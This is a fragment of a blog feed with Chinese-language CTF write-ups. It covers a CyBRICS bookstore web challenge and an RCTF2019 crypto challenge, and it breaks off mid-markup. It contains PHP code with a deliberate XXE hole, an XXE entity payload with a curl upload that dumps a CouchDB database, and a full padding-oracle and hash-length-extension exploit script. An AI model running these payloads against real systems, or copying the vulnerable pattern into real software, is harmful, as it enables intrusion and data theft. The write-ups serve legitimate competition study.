class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">save2db</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">        $headers = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">"Content-type: application/json"</span>,</span><br><span class="line">        );</span><br><span class="line">        </span><br><span class="line">        $data = json_encode($data);</span><br><span class="line">            </span><br><span class="line">        $myCurl = curl_init();</span><br><span class="line">        curl_setopt_array($myCurl, <span class="keyword">array</span>(</span><br><span class="line">            CURLOPT_URL =&gt; <span class="string">'http://127.0.0.1:5984/library'</span>,</span><br><span class="line">            CURLOPT_RETURNTRANSFER =&gt; <span class="keyword">true</span>,</span><br><span class="line">            CURLOPT_HTTPHEADER =&gt; $headers,</span><br><span class="line">            CURLOPT_ENCODING =&gt; <span class="string">'gzip,deflate'</span>,</span><br><span class="line">            CURLOPT_POST =&gt; <span class="keyword">true</span>,</span><br><span class="line">            CURLOPT_POSTFIELDS =&gt; $data</span><br><span class="line">        ));</span><br><span class="line">        $response = curl_exec($myCurl);</span><br><span class="line">        curl_close($myCurl);</span><br><span class="line">        <span class="keyword">return</span> $response;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">($xmlfile)</span> </span>&#123;</span><br><span class="line">        libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">        $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">        $dom-&gt;loadXML($xmlfile, LIBXML_NOENT);</span><br><span class="line">        $creds = simplexml_import_dom($dom);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($creds-&gt;description)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Description not found"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($creds-&gt;description-&gt;&#123;<span class="string">'title-info'</span>&#125;)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Title info not found"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $titleinfo = $creds-&gt;description-&gt;&#123;<span class="string">'title-info'</span>&#125;;</span><br><span class="line">        <span class="keyword">foreach</span> ([<span class="string">'genre'</span>, <span class="string">'author'</span>, <span class="string">'book-title'</span>, <span class="string">'annotation'</span>, <span class="string">'date'</span>, <span class="string">'lang'</span>] <span class="keyword">as</span> $item) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!property_exists($titleinfo, $item)) &#123;</span><br><span class="line">                <span class="keyword">return</span> $item . <span class="string">" not found"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        save2db([<span class="string">'title'</span> =&gt; base64_encode($titleinfo-&gt;&#123;<span class="string">'book-title'</span>&#125;), <span class="string">'date'</span> =&gt; $titleinfo-&gt;&#123;<span class="string">'date'</span>&#125;, <span class="string">'url'</span> =&gt; bin2hex(random_bytes(<span class="number">16</span>))]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $titleinfo;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $results = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_FILES[<span class="string">"newbook"</span>])) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($_FILES[<span class="string">'newbook'</span>][<span class="string">'error'</span>] == UPLOAD_ERR_OK</span><br><span class="line">            &amp;&amp; is_uploaded_file($_FILES[<span class="string">'newbook'</span>][<span class="string">'tmp_name'</span>])</span><br><span class="line">        ) &#123;</span><br><span class="line"></span><br><span class="line">            $name = $_FILES[<span class="string">'newbook'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            exec(<span class="string">"/var/www/main d "</span> . $name . <span class="string">" "</span> . $name . <span class="string">".decoded"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!is_file($name . <span class="string">".decoded"</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"Decoding ERROR"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                $data = file_get_contents($name . <span class="string">".decoded"</span>);</span><br><span class="line">                $data = gzuncompress($data);</span><br><span class="line">                $results = process($data);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1, shrink-to-fit=no"</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;title&gt;<span class="keyword">New</span> CyBRICS BookStore&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- Bootstrap core CSS --&gt;</span><br><span class="line">    &lt;link href=<span class="string">"../css/bootstrap.min.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class="d-flex flex-column flex-md-row align-items-center p-3 px-md-4 mb-3 bg-white border-bottom box-shadow"&gt;</span><br><span class="line">    &lt;h5 class="my-0 mr-md-auto font-weight-normal"&gt;CyBRICS BookStore&lt;/h5&gt;</span><br><span class="line">    &lt;nav class="my-2 my-md-0 mr-md-3"&gt;</span><br><span class="line">        &lt;a class="p-2 text-dark" href="#"&gt;Authors zone&lt;/a&gt;</span><br><span class="line">    &lt;/nav&gt;</span><br><span class="line">    &lt;a class="btn btn-outline-primary" href="#"&gt;Sign up&lt;/a&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class="pricing-header px-3 py-3 pt-md-5 pb-md-4 mx-auto text-center"&gt;</span><br><span class="line">    &lt;h1 class="display-4"&gt;Authors zone&lt;/h1&gt;</span><br><span class="line">    &lt;p class="lead"&gt;Our site is under development, but you already can &lt;a href=""&gt;download DRM&lt;/a&gt; and demo books&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class="container"&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;h2&gt;You can add your book&lt;/h2&gt;</span><br><span class="line">        &lt;div&gt;&lt;small&gt;* You will be further informed about review results&lt;/small&gt;&lt;/div&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">            &lt;form enctype=<span class="string">"multipart/form-data"</span> action=<span class="string">"/authorszone/index.php"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">                &lt;input type=<span class="string">"file"</span> name=<span class="string">"newbook"</span>&gt;</span><br><span class="line">                &lt;input type=<span class="string">"submit"</span> value=<span class="string">"Submit for review"</span>&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div style=<span class="string">"margin-top: 10px"</span>&gt;</span><br><span class="line">            &lt;table class="table table-striped"&gt;</span><br><span class="line">            <span class="meta">&lt;?php</span></span><br><span class="line">                <span class="keyword">if</span> (is_object($results)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Book is under review:&lt;/h2&gt;"</span>;</span><br><span class="line">                    <span class="keyword">foreach</span> ([<span class="string">'genre'</span>, <span class="string">'author'</span>, <span class="string">'book-title'</span>, <span class="string">'annotation'</span>, <span class="string">'date'</span>, <span class="string">'lang'</span>] <span class="keyword">as</span> $item) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;"</span>.$item.<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>.$results-&gt;&#123;$item&#125;-&gt;asXML().<span class="string">"&lt;/td&gt;&lt;/tr&gt;"</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">echo</span> $results;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="meta">?&gt;</span></span><br><span class="line">            &lt;/table&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;footer class="pt-4 my-md-5 pt-md-5 border-top"&gt;</span><br><span class="line">        &lt;div class="row"&gt;</span><br><span class="line">            &lt;div class="col-12 col-md"&gt;</span><br><span class="line">                &lt;img class="mb-2" src="https://getbootstrap.com/assets/brand/bootstrap-solid.svg" alt="" width="24" height="24"&gt;</span><br><span class="line">                &lt;small class="d-block mb-3 text-muted"&gt;&amp;copy; 2018&lt;/small&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/footer&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- Bootstrap core JavaScript</span><br><span class="line">================================================== --&gt;</span><br><span class="line">&lt;!-- Placed at the end of the document so the pages load faster --&gt;</span><br><span class="line">&lt;script src=<span class="string">"https://code.jquery.com/jquery-3.2.1.slim.min.js"</span> integrity=<span class="string">"sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN"</span> crossorigin=<span class="string">"anonymous"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä¸ºäº†ç»•è¿‡ libxml è‡ªå¸¦çš„å®‰å…¨æªæ–½, å‡ºé¢˜äººä¹Ÿæ˜¯ç…è´¹è‹¦å¿ƒ 233.<br>åœ¨æºç é‡Œé¢å¯ä»¥å‘ç°ç”¨äº† <code>couchdb</code>, å¥½åœ¨æ”¯æŒ http åè®®, æˆ‘ä»¬é€šè¿‡ http è®¿é—® <code>couchdb</code> çš„å„ç§ API.<br>ç¿»äº†ç¿»æ–‡æ¡£, å¯ä»¥å‘ç°ç”¨</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM "http://127.0.0.1:5984/library/_changes?include_docs=true" &gt;]&gt;</span></span><br></pre></td></tr></table></figure><p>å°±èƒ½ç›´æ¥è„±è£¤ (æ¯”è¾ƒå¤§, æµè§ˆå™¨ä¼šå¡æ­», å»ºè®®ç›´æ¥ curl è„±  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">'http://45.77.219.97/authorszone/index.php'</span> -H <span class="string">'Cache-Control: max-age=0'</span> -H <span class="string">'Origin: http://45.77.219.97'</span> -H <span class="string">'Upgrade-Insecure-Requests: 1'</span> -H <span class="string">'DNT: 1'</span>  -H <span class="string">'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36'</span> -H <span class="string">'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'</span> -H <span class="string">'Referer: http://45.77.219.97/authorszone/index.php'</span> -F <span class="string">'newbook=@evil.fb2enc'</span> --compressed --insecure -vv -o asd2.html</span><br></pre></td></tr></table></figure><p>å¾—åˆ° </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;seq&quot;:1,&quot;id&quot;:&quot;648ed731593e7c015c96df3f21000a2b&quot;,&quot;changes&quot;:[&#123;&quot;rev&quot;:&quot;1-d8bf4bb75eae1dd6117c8a59b952e27e&quot;&#125;],&quot;doc&quot;:&#123;&quot;_id&quot;:&quot;648ed731593e7c015c96df3f21000a2b&quot;,&quot;_rev&quot;:&quot;1-d8bf4bb75eae1dd6117c8a59b952e27e&quot;,&quot;title&quot;:&quot;Mona Lisa Overdrive&quot;,&quot;url&quot;:&quot;4cb21fe9786c74f0b83f1fa808e30e4d&quot;&#125;&#125;,</span><br><span class="line">&#123;&quot;seq&quot;:2,&quot;id&quot;:&quot;648ed731593e7c015c96df3f21000ac6&quot;,&quot;changes&quot;:[&#123;&quot;rev&quot;:&quot;1-4802d0cdd11425ffcc9500b5f5db9a56&quot;&#125;],&quot;doc&quot;:&#123;&quot;_id&quot;:&quot;648ed731593e7c015c96df3f21000ac6&quot;,&quot;_rev&quot;:&quot;1-4802d0cdd11425ffcc9500b5f5db9a56&quot;,&quot;title&quot;:&quot;Small Prince&quot;,&quot;url&quot;:&quot;6506dad64d2353f25cca891f81443a8e&quot;&#125;&#125;,</span><br><span class="line">&#123;&quot;seq&quot;:3,&quot;id&quot;:&quot;648ed731593e7c015c96df3f21000ba3&quot;,&quot;changes&quot;:[&#123;&quot;rev&quot;:&quot;1-094bdefdba07bc63ae11584c79c51909&quot;&#125;],&quot;doc&quot;:&#123;&quot;_id&quot;:&quot;648ed731593e7c015c96df3f21000ba3&quot;,&quot;_rev&quot;:&quot;1-094bdefdba07bc63ae11584c79c51909&quot;,&quot;title&quot;:&quot;Flag Book&quot;,&quot;url&quot;:&quot;3ba9318b509034cb7b506df0faef4d80&quot;&#125;&#125;,</span><br></pre></td></tr></table></figure><p>ç»“åˆ url çš„å‚æ•°, åœ¨ <code>http://45.77.219.97/books/3ba9318b509034cb7b506df0faef4d80.fb2enc</code> å°±èƒ½ä¸‹åˆ° Flag Book å•¦.<br>è§£å¯†ä¸€ä¸‹, ç„¶åå°±å¯ä»¥æ‰¾åˆ°åœ¨é‡Œé¢çš„ flag ä¸€æš</p><p><img src="https://i.loli.net/2019/07/22/5d351ec06428750220.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;è¿™é¢˜æ˜¯åœ¨æ¯”èµ›ç»“æŸåæ‰åšå‡ºæ¥çš„, æ¯”è¾ƒå¯æƒœ, ä½†æ˜¯é¢˜ç›®æœ¬èº«è¿˜æ˜¯æ¯”è¾ƒæœ‰æ„æ€çš„, æ‰€ä»¥å†™ä¸ª Writeup.&lt;br&gt;(æ—©çŸ¥é“æ—©ç‚¹èµ·åºŠåšé¢˜äº†&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="web" scheme="https://rmb122.com/tags/web/"/>
    
      <category term="writeup" scheme="https://rmb122.com/tags/writeup/"/>
    
      <category term="misc" scheme="https://rmb122.com/tags/misc/"/>
    
      <category term="crypto" scheme="https://rmb122.com/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>RCTF2019 baby_crypto &amp; baby_aes</title>
    <link href="https://rmb122.com/2019/05/22/RCTF2019-baby-crypto-baby-aes-Writeup/"/>
    <id>https://rmb122.com/2019/05/22/RCTF2019-baby-crypto-baby-aes-Writeup/</id>
    <published>2019-05-22T09:51:21.000Z</published>
    <updated>2019-07-22T01:47:16.145Z</updated>
    
    <content type="html"><![CDATA[<p>å¯†ç å­¦åªåšå‡ºæ¥ä¸¤é¢˜ baby, æš—ç¤ºæˆ‘è¿˜æ˜¯å­¦å¯†ç å­¦çš„ baby (é€ƒ</p><a id="more"></a><h2 id="baby-crypto"><a href="#baby-crypto" class="headerlink" title="baby_crypto"></a>baby_crypto</h2><p>è¿™é¢˜è¿˜ç®—æ¯”è¾ƒå¸¸è§„, ä¸»è¦é€»è¾‘å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(<span class="string">"Input your cookie:"</span>)</span><br><span class="line">        data_hex = sys.stdin.readline().strip()</span><br><span class="line">        data = binascii.unhexlify(data_hex)</span><br><span class="line">        <span class="keyword">assert</span>(len(data) &gt; iv_len + hash_len)</span><br><span class="line">        iv, cookie_padded_encrypted, hv = data[:iv_len], data[iv_len: -hash_len], data[-hash_len:]</span><br><span class="line">        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)</span><br><span class="line">        decryptor = cipher.decryptor()</span><br><span class="line">        cookie_padded = decryptor.update(cookie_padded_encrypted) + decryptor.finalize()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cookie = unpad(cookie_padded)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(<span class="string">"Invalid padding"</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> is_valid_hash(cookie, hv):</span><br><span class="line">            print(<span class="string">"Invalid hash"</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        info = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> cookie.split(<span class="string">b";"</span>):</span><br><span class="line">            k, v = _.split(<span class="string">b":"</span>)</span><br><span class="line">            info[k] = v</span><br><span class="line">        <span class="keyword">if</span> info[<span class="string">b"admin"</span>] == <span class="string">b"1"</span>:</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">"flag"</span>) <span class="keyword">as</span> f:</span><br><span class="line">                flag = f.read()</span><br><span class="line">                print(<span class="string">"Your flag: %s"</span> %flag)</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾çš„çœ‹åˆ°å¯ä»¥ <code>padding oracle</code>, åªè¦æ»¡è¶³ <code>info[b&quot;admin&quot;] == b&quot;1&quot;</code> å°±å¯ä»¥æ‹¿åˆ° <code>flag</code>,<br>ä½†åœ¨ <code>cookie</code> åé¢è®¾ç½®äº† hash æ¥æ•ˆéªŒ <code>cookie</code> çš„æœ‰æ•ˆæ€§, ä½†æ˜¯æ²¡æœ‰æ£€æµ‹é‡å¤çš„é”®å€¼<br>æ‰€ä»¥è¿™é‡Œå¯ä»¥ç»“åˆé•¿åº¦æ‰©å±•æ”»å‡», æˆ‘ä»¬å‡è®¾ <code>cookie</code> ä¸º <code>admin:0;username:abcde;password:abcde</code><br>æˆ‘ä»¬å¯ä»¥åœ¨åŸ <code>cookie</code> åé¢æ·»åŠ ä¸€ä¸ª <code>;admin:1</code>, å¾—åˆ°<br><code>admin:0;username:abcde;password:abcde\x80\x00\x00\x00\x00\x00\x00\x00\x00\x01\xa8;admin:1</code>,<br>å› ä¸ºé¡ºåºçš„å…³ç³», è¿™å°†è¦†ç›–ä¹‹å‰çš„å€¼, ä»è€Œæ»¡è¶³æ¡ä»¶. è„šæœ¬å¦‚ä¸‹<br>ä¸€å¼€å§‹æ²¡æœ‰å›½å†…çš„æœåŠ¡å™¨, å†™å®Œä¸‹åˆç¡äº†ä¸€è§‰èµ·æ¥æ‰è·‘å®Œ 233</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> remotecli <span class="comment"># https://github.com/rmb122/remoteCLI</span></span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding</span><span class="params">(byte)</span>:</span></span><br><span class="line">    padlen = <span class="number">16</span> - len(byte) % <span class="number">16</span></span><br><span class="line">    byte += bytearray([padlen] * padlen)</span><br><span class="line">    <span class="keyword">return</span> byte</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addIvLastByte</span><span class="params">(iv, currIndex, midval)</span>:</span></span><br><span class="line">    target = <span class="number">16</span> + <span class="number">1</span> - currIndex</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(currIndex, <span class="number">16</span>):</span><br><span class="line">        iv[i] = midval[i] ^ target</span><br><span class="line">    <span class="keyword">return</span> iv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        result.append(a[i] ^ b[i])</span><br><span class="line">    result = bytearray(result)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">cli = remotecli.CLI()</span><br><span class="line">cli.connect(<span class="string">'207.148.68.109'</span>, <span class="number">20000</span>)</span><br><span class="line">cli.sendLine(<span class="string">'abcde'</span>)</span><br><span class="line">cli.sendLine(<span class="string">'abcde'</span>)</span><br><span class="line"></span><br><span class="line">hv_hex_len = <span class="number">40</span></span><br><span class="line">iv_len = <span class="number">16</span></span><br><span class="line">orgCookie = <span class="string">'admin:0;username:abcde;password:abcde'</span></span><br><span class="line"></span><br><span class="line">cookie = cli.recvLinesUntilHave(<span class="string">'Input your cookie:'</span>)[<span class="number">-2</span>]</span><br><span class="line">print(cookie)</span><br><span class="line">hv_hex = cookie[-hv_hex_len:]</span><br><span class="line">iv = cookie[:iv_len]</span><br><span class="line">cookieEnc = cookie[iv_len: - hv_hex_len]</span><br><span class="line"></span><br><span class="line">fakeHash, fakeCookie = hashpumpy.hashpump(hv_hex, orgCookie, <span class="string">';admin:1'</span>, iv_len)</span><br><span class="line">print(fakeCookie)</span><br><span class="line">print(fakeHash)</span><br><span class="line"></span><br><span class="line">fakeHash = bytearray(unhexlify(fakeHash))</span><br><span class="line">fakeCookie = padding(fakeCookie)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> len(fakeCookie) == <span class="number">64</span></span><br><span class="line">dummy = bytearray([<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(fakeCookie) + <span class="number">16</span>)]) <span class="comment"># iv + cookie</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pos <span class="keyword">in</span> range(<span class="number">64</span> + <span class="number">16</span>, <span class="number">16</span>, -iv_len):</span><br><span class="line">    curr = dummy[pos - iv_len:pos]</span><br><span class="line">    iv = bytearray([<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(iv_len)])</span><br><span class="line">    midval = bytearray([<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(iv_len)])</span><br><span class="line">    <span class="keyword">for</span> currIndex <span class="keyword">in</span> range(<span class="number">0</span>, iv_len)[::<span class="number">-1</span>]:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range(<span class="number">0</span>, <span class="number">256</span>)):</span><br><span class="line">            iv[currIndex] = i</span><br><span class="line">            cli.sendLine(hexlify(iv + curr + fakeHash))</span><br><span class="line">            res = cli.recvline()</span><br><span class="line">            <span class="comment">#print(res)</span></span><br><span class="line">            cli.recvline()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"Invalid padding"</span> <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">                midval[currIndex] = (<span class="number">16</span> - currIndex) ^ iv[currIndex]</span><br><span class="line">                <span class="keyword">if</span> currIndex == <span class="number">0</span>:</span><br><span class="line">                    tmp = xor(midval, fakeCookie[pos-iv_len*<span class="number">2</span>:pos-iv_len])</span><br><span class="line">                    <span class="keyword">for</span> tmpPos <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">16</span>):</span><br><span class="line">                        dummy[pos-iv_len*<span class="number">2</span> + tmpPos] = tmp[tmpPos]</span><br><span class="line">                iv = addIvLastByte(iv, currIndex, midval)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">cli.sendLine(hexlify(dummy + fakeHash))</span><br><span class="line">cli.console()</span><br></pre></td></tr></table></figure><h2 id="baby-aes"><a href="#baby-aes" class="headerlink" 